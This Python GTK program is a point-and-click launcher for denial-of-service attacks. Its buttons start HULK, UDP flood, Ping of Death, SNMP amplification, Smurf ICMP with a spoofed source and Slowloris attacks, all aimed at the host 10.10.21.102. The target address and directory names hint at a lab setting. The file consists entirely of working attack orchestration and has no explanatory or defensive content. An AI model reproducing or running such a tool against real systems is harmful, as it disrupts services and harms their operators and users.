#!/usr/bin/python
# -*- coding: utf-8 -*-

from gi.repository import Gtk
import runpy
import os

class Handler:
    def button_1clicked(self, button):
      print "HULK"
      os.system('python hulk.py http://10.10.21.102')
      runpy.run_path('/home/client/Desktop/Cyber/hulk.py')
    def button2_clicked(self, button):
      print "UDP"
      os.system('python flood_udp.py 10.10.21.102 80 10')
      runpy.run_path('/home/client/Desktop/Cyber/flood_udp.py')
    def button3_clicked(self, button):
      print "POD"
      os.system('sudo python PoD.py')
      runpy.run_path('/home/client/Desktop/Cyber/PoD.py')
    def button4_clicked(self, button):
      print "SNMP"
      os.system('sudo python snmp-py.py 10.10.21.102 file.txt 1')
      runpy.run_path('/home/client/Desktop/Cyber/snmp-py.py')
    def button5_clicked(self, button):
      print "SMURF ICMP"
      os.system('sudo hping3 --icmp --spoof 10.10.21.102 10.10.21.255')
    def button6_clicked(self, button):
      print "SLOWLORIS"
      os.system('perl slowloris.pl -dns 10.10.21.102')
    
      


builder = Gtk.Builder()
builder.add_from_file("myprogram.glade")
builder.connect_signals(Handler())

ournewbutton = builder.get_object("button1")
ournewbutton.set_label("HULK")

ournewbutton1 = builder.get_object("button2")
ournewbutton1.set_label("UDP")

ournewbutton2 = builder.get_object("button3")
ournewbutton2.set_label("POD")

ournewbutton3 = builder.get_object("button4")
ournewbutton3.set_label("SNMP")

ournewbutton4 = builder.get_object("button5")
ournewbutton4.set_label("Smurf")

ournewbutton4 = builder.get_object("button6")
ournewbutton4.set_label("SLOWLORIS")




window = builder.get_object("window1")

window.connect("delete-event", Gtk.main_quit)
window.show_all()
Gtk.main()
